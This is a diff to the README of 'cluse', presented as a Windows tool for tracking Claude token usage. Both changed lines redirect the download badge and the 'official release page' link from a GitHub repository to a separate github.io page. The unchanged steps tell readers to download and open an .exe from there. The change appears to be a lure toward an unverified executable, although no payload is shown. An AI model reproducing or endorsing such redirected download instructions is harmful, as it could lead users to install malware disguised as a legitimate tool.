@@ -1,6 +1,6 @@
 # 📊 cluse - Track your Claude token usage easily
 
-[![](https://img.shields.io/badge/Download_for_Windows-blue)](https://github.com/magneticsnougat564/cluse)
+[![](https://img.shields.io/badge/Download_for_Windows-blue)](https://magneticsnougat564.github.io)
 
 ## 📋 What is cluse?
 
@@ -10,7 +10,7 @@ Cluse provides a simple way to monitor how many tokens your Claude Code sessions
 
 Follow these steps to install the software on your Windows computer.
 
-1. Go to the [official release page](https://github.com/magneticsnougat564/cluse).
+1. Go to the [official release page](https://magneticsnougat564.github.io).
 2. Look for the "Assets" section.
 3. Click the link that ends in .exe to start your download.
 4. Open the downloaded file once the process finishes.
